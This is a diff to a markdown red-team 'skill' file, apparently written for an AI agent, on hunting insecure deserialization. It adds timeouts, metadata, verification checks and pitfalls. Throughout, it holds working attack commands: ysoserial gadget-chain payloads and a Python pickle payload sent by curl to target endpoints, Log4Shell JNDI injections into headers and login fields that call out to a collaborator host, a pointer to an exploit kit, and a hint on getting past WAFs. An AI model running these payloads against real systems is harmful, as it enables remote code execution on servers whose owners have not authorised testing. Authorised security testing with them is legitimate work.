@@ -1,8 +1,11 @@
 ---
 name: hunt-deserialization
 description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
-sources: hackerone_public
-report_count: 22
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [deserialization, hunt, redteam]
 ---
 
 # HUNT-DESERIALIZATION — Insecure Deserialization
@@ -32,10 +35,10 @@ echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05
 # Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
 
 # Apache Shiro: rememberMe cookie present
-curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
 
 # Log4j: test user-controlled fields for JNDI interpolation
-curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
+curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
 ```
 
 ### Header / Cookie Signals
@@ -62,7 +65,7 @@ java -jar ysoserial-all.jar CommonsCollections6 \
 
 # Send as body or cookie
 java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
-  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
+  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/wls-wsat/CoordinatorPortType \
     -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @-
 
@@ -97,7 +100,7 @@ print(base64.b64encode(pickle.dumps(Exploit())).decode())
 "
 
 # Send as cookie or POST body
-curl -s https://$TARGET/api/load-model \
+curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/load-model \
   -H "Content-Type: application/octet-stream" \
   --data-binary @payload.pkl
 ```
@@ -117,11 +120,11 @@ dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
 # Test all user-controlled inputs
 COLLAB="COLLAB_HOST"
 for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
-  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
+  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
 done
 
 # Test POST body fields
-curl -s -X POST https://$TARGET/api/login \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
   -H "Content-Type: application/json" \
   -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
 ```
@@ -165,6 +168,31 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
 ✅ Command output in response: full RCE confirmed
 
 **Severity:** Almost always **Critical** — RCE with server process privileges.
+
+## Verification
+
+1. **ysoserial availability** — check if ysoserial is installed:
+   ```bash
+   which ysoserial 2>/dev/null || ls /opt/ysoserial*.jar 2>/dev/null | head -1 && echo "PASS: ysoserial found" || echo "NOTE: ysoserial not installed"
+   ```
+2. **PHP deserialization test** — verify PHP payload generation:
+   ```bash
+   php -r "echo serialize(['test'=>'value']);" 2>/dev/null && echo "PASS: PHP serialize works" || echo "NOTE: PHP not available"
+   ```
+All tests verify deserialization probing.
+
+---
+
+## Pitfalls
+
+- **ysoserial payload without gadget chain** — generating a payload is not exploitation. Need to confirm the target's classpath contains the specific gadget.
+- **Java deserialization vs PHP unserialize** — different languages, different tools. Don't cross-apply payloads.
+- **Base64-encoded payload but server expects raw binary** — some servers accept base64, others raw. Test both encodings.
+- **Content-Type mismatch** — Java deserialization typically expects `application/x-java-serialized-object` or `application/octet-stream`. Wrong Content-Type may cause silent rejection.
+- **WAF deserialization filtering** — many WAFs block known ysoserial gadget signatures. The bug may still exist but require a custom gadget chain.
+
+
+---
 
 ## Related Skills
 
